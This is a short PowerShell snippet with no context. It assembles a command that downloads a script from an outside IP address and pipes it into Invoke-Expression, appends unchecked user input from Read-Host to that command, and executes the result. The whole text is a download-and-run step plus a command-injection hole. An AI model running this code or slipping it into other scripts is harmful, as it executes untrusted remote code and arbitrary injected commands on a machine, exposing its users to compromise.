$c = "iwr http://203.0.113.5/x | iex"
$c += (Read-Host)
powershell -Command $c
